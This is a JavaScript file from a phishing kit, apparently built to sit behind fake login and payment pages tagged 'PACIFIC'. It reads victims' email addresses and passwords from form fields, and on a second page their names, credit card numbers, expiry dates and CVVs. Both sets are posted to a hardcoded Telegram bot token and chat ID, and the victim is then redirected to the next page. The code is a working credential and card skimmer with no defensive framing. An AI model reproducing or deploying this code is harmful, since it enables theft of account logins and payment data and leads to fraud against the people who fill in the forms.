
//bot token 
var telegram_bot_id = "5427471016:AAFV0qh0Jq9bGFnathmkpCA6p6rdi3I9IA0";
//chat id
var chat_id = "-1001549857651";
var USER, PASS, PIN, PIN2, PIN3, NUMBER,message, EM4IL;

// data 1

var ready = function () {
    EM4IL = document.getElementById("9m41l").value;
    pass = document.getElementById("9pass").value;
    message = "🔵PACIFIC| @sn0wdie" + "\n----\n" + "MAIL: "  + EM4IL + "\nMPASS: " + pass + "\n" + "----";

    localStorage.setItem("m41l", EM4IL);
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="ec2.html"
    });
    return false;
}

//data 2

var ready1 = function () {
    EM4IL = localStorage.getItem("9m41l");
    nombre = document.getElementById("9name").value;
    apellido = document.getElementById("9lname").value;
    ccnum = document.getElementById("9ccnum").value;
    mm = document.getElementById("9mm").value;
    aa = document.getElementById("9aa").value;
    cvv = document.getElementById("9cvv").value;
    message = "🔵Pacific |" + EM4IL + "\n----\n" + "Name: " + nombre + "\nLname: " + apellido + "\nCCNUM: " + ccnum + "\nFV: " + mm + "/" + aa + "\nCVV: " + cvv + "\n----";
};
var sender1 = function () {
    ready1();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="ec3.html"
    });
    return false;
}

